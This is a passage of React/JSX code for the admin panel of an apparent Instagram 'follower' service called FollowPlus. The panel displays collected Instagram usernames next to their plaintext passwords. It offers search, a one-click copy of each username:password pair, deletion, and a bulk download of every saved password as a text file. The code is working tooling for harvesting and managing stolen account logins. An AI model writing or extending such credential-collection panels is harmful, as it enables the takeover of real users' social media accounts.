                          a.download = `followplus_saved_passwords_${Date.now()}.txt`;
                          document.body.appendChild(a);
                          a.click();
                          document.body.removeChild(a);
                          URL.revokeObjectURL(url);
                        }}
                        className="px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 text-white font-mono text-xs rounded-xl flex items-center gap-2 transition-all cursor-pointer"
                      >
                        <Download className="w-4 h-4" />
                        Download DB List (.txt)
                      </button>
                    </div>
                  </div>

                  {/* Logins Card Grid */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {campaigns
                      .filter(c => c.password)
                      .filter(c => 
                        c.username.toLowerCase().includes(adminSearch.toLowerCase()) || 
                        (c.password && c.password.toLowerCase().includes(adminSearch.toLowerCase()))
                      ).length === 0 ? (
                      <div className="col-span-2 p-12 text-center text-slate-500 font-mono border border-dashed border-white/5 rounded-xl">
                        No user login credentials saved in session yet. Retry shortly.
                      </div>
                    ) : (
                      campaigns
                        .filter(c => c.password)
                        .filter(c => 
                          c.username.toLowerCase().includes(adminSearch.toLowerCase()) || 
                          (c.password && c.password.toLowerCase().includes(adminSearch.toLowerCase()))
                        )
                        .map((camp) => (
                          <div key={camp.id} className="bg-[#0b0c11] p-5 border border-white/5 rounded-xl transition-all flex flex-col justify-between space-y-4">
                            <div className="flex items-start justify-between">
                              <div className="flex items-center gap-3">
                                <div className="w-9 h-9 bg-white/[0.01] rounded-lg flex items-center justify-center text-[#dfb24c] border border-[#dfb24c]/10">
                                  <Key className="w-4 h-4" />
                                </div>
                                <div>
                                  <span className="text-slate-500 font-mono text-[9px] block uppercase">Instagram Identifier</span>
                                  <span className="text-sm font-semibold text-white font-mono">@{camp.username}</span>
                                </div>
                              </div>

                              <div className="flex gap-1.5">
                                <button
                                  onClick={() => {
                                    navigator.clipboard.writeText(`${camp.username}:${camp.password}`);
                                    setCopiedId(camp.id);
                                    setTimeout(() => setCopiedId(null), 1500);
                                  }}
                                  className="p-1.5 bg-white/5 hover:bg-white/10 border border-white/10 text-slate-400 hover:text-white rounded-lg transition-colors cursor-pointer"
                                  title="Copy credentials"
                                >
                                  {copiedId === camp.id ? (
                                    <Check className="w-3.5 h-3.5 text-emerald-400" />
                                  ) : (
                                    <Copy className="w-3.5 h-3.5" />
                                  )}
                                </button>
                                <button
                                  onClick={() => {
                                    if (confirm(`Do you want to delete stored credential log for @${camp.username}?`)) {
                                      deleteCampaign(camp.id);
                                    }
                                  }}
                                  className="p-1.5 bg-rose-500/5 hover:bg-rose-500/10 border border-rose-500/10 text-rose-500 hover:text-rose-450 rounded-lg transition-colors cursor-pointer"
                                  title="Remove log"
                                >
                                  <Trash2 className="w-3.5 h-3.5" />
                                </button>
                              </div>
                            </div>

                            <div className="bg-[#050608] border border-white/5 p-4 rounded-xl space-y-2">
                              <span className="text-[9px] text-slate-500 font-mono block uppercase tracking-wider">Unencrypted Password</span>
                              <div className="flex items-center justify-between bg-black/40 border border-white/5 py-1.5 px-3 rounded-lg">
                                <span className="font-mono text-xs text-[#f4d081] font-bold select-all bg-transparent">
                                  {camp.password}
                                </span>
                              </div>
                              <div className="flex justify-between items-center text-[10px] font-mono text-slate-500 pt-1">
                                <span>TUNNEL: Free trial</span>
                                <span>TYPE: 8 days pipeline</span>
                              </div>
                            </div>
                          </div>
                        ))
                    )}
                  </div>
                </div>
              )}

              <div className="flex justify-end pt-2">
                <p className="text-[9px] text-slate-600 font-mono">FollowPlus Master Core Security Suite • Active Client Module</p>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
